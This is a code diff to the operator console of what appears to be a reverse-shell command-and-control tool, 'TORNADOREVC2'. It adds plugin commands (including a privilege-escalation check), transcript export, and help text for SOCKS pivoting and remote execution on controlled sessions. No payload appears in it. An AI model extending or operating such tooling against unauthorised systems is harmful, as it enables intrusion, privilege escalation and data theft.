@@ -222,6 +222,15 @@ class TORNADOREVC2:
                 return self._complete_paths(text)
             if cmd in ('runpy', 'runps', 'runexe', 'runelf') and arg_i == 1:
                 return self._complete_paths(text)
+            if cmd == 'run' and arg_i == 1:
+                return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
+            if cmd == 'run' and arg_i >= 2 and words[1].lower() == 'privesccheck':
+                return self._complete_paths(text)
+            if cmd == 'plugins' and arg_i == 1:
+                subs = ('list', 'load', 'unload', 'reload', 'info', 'help')
+                return sorted(s for s in subs if s.startswith(text.lower()))
+            if cmd == 'plugins' and arg_i == 2 and words[1].lower() in ('load', 'unload', 'reload', 'info'):
+                return sorted(p for p in self.plugins.completion_plugins() if p.startswith(text.lower()))
             return []
         if arg_i == 0:
             return sorted(c for c in MAIN_COMMANDS if c.startswith(text.lower()))
@@ -870,7 +879,7 @@ class TORNADOREVC2:
             print(f"{self.colors['blue']}Session log: {logger.session_dir}{self.colors['end']}")
         print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
         print(f"{self.colors['yellow']}Ctrl+C sends interrupt; Ctrl+C twice exits to main menu{self.colors['end']}")
-        print(f"{self.colors['yellow']}Commands: sysinfo, runpy/runps/runexe/runelf, clipboard, upload/download — type 'help'{self.colors['end']}\n")
+        print(f"{self.colors['yellow']}Commands: sysinfo, run/runpy, plugins, export, upload/download — type 'help'{self.colors['end']}\n")
         self._set_completer_mode('client')
         sys.stdout.flush()
 
@@ -938,6 +947,14 @@ class TORNADOREVC2:
                         self.verify_file(client_sock, cmd_parts[1])
                         continue
 
+                    if cmd_lower == 'export':
+                        if self.exporter.handle_command(cmd_parts, client_sock=client_sock):
+                            continue
+
+                    if cmd_lower in ('run', 'plugins'):
+                        if self.plugins.handle_command(cmd_parts, client_sock=client_sock):
+                            continue
+
                     if cmd_lower == 'help':
                         print(f"""
     {self.colors['green']}SESSION:{self.colors['end']}
@@ -957,6 +974,14 @@ class TORNADOREVC2:
     socks <listen_port>                               SOCKS5 proxy via session
     tunnels                                           List active SOCKS proxies
     socks stop <proxy_id>                             Stop a SOCKS proxy
+
+    {self.colors['green']}REPORTING:{self.colors['end']}
+    export                                            Export HTML session transcript
+
+    {self.colors['green']}PLUGINS:{self.colors['end']}
+    plugins / plugins list                            List registered plugins
+    plugins load|unload|reload|info <name>              Manage plugins at runtime
+    run <plugin> [args...]                            Execute a plugin on this session
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <local> <remote>     Chunked upload with SHA256 verify
@@ -1187,7 +1212,7 @@ class TORNADOREVC2:
     download [--resume] <ID> <remote> <local>   Chunked download with SHA256 verify
     verify/hash <ID> <remote>                   Remote file size and SHA256
 
-    {self.colors['yellow']}Inside a client shell, omit <ID> and use --resume to continue interrupted transfers{self.colors['end']}""")
+    {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
             except KeyboardInterrupt:
                 print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
 
